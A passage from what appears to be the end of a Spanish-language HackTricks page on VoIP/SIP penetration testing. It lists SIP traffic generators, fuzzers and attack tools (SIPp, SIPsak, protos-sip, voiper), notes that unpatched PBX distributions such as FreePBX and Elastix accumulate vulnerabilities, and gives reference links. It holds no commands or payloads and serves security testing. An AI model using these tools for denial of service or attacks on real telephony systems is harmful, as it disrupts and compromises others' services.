- [**SIPp**](https://github.com/SIPp/sipp): Permite analizar y generar tráfico SIP, por lo que también se puede usar para DoS.
- [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Cuchillo suizo SIP. También se puede usar para realizar ataques SIP.
- Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### Vulnerabilidades del SO

La forma más fácil de instalar un software como Asterisk es descargar una **distribución de SO** que ya lo tenga instalado, como: **FreePBX, Elastix, Trixbox**... El problema con estos es que una vez que está funcionando, los administradores del sistema podrían **no actualizarlos nuevamente** y **las vulnerabilidades** se descubrirán con el tiempo.

## Referencias

- [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
- [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
- [http://blog.pepelux.org/](http://blog.pepelux.org/)
- [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
- [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
- [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{{#include ../../banners/hacktricks-training.md}}
